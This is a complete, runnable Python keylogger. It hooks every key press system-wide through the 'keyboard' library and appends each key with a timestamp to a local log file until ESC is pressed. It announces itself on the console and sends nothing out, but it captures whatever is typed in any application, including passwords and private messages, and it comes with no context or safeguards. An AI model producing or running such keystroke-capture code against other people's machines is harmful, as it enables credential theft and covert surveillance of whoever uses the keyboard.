import keyboard
import datetime
import os
from pathlib import Path

class BasicKeylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.start_time = datetime.datetime.now()
        self.setup_log_file()
        
    def setup_log_file(self):
        """Create or append to the log file with a header"""
        with open(self.log_file, 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Keylogger started at: {self.start_time}\n")
            f.write(f"{'='*50}\n\n")
    
    def on_key_event(self, event):
        """Callback function for key events"""
        key = event.name
        
        # Handle special keys
        if event.event_type == keyboard.KEY_DOWN:
            if key == 'space':
                key = ' '
            elif key == 'enter':
                key = '\n'
            elif key == 'decimal':
                key = '.'
            elif len(key) > 1:
                key = f"[{key.upper()}]"
            
            # Log the key with timestamp
            self.log_keystroke(key)
    
    def log_keystroke(self, key):
        """Write the keystroke to the log file"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, 'a') as f:
            f.write(f"{timestamp}: {key}\n")
    
    def start(self):
        """Start the keylogger"""
        print(f"Keylogger started. Press ESC to stop.")
        print(f"Logging to: {os.path.abspath(self.log_file)}")
        
        # Set up the keyboard hook
        keyboard.on_press(self.on_key_event)
        
        # Wait for ESC key to be pressed to stop
        keyboard.wait('esc')
        
        # Clean up
        self.stop()
    
    def stop(self):
        """Stop the keylogger and clean up"""
        keyboard.unhook_all()
        end_time = datetime.datetime.now()
        
        with open(self.log_file, 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Keylogger stopped at: {end_time}\n")
            f.write(f"Total duration: {end_time - self.start_time}\n")
            f.write(f"{'='*50}\n")
        
        print(f"\nKeylogger stopped. Log saved to: {os.path.abspath(self.log_file)}")

if __name__ == "__main__":
    # Create a keylogger instance
    keylogger = BasicKeylogger()
    
    try:
        # Start the keylogger
        keylogger.start()
    except KeyboardInterrupt:
        print("\nInterrupted by user")
        keylogger.stop()
    except Exception as e:
        print(f"An error occurred: {e}")
        keylogger.stop()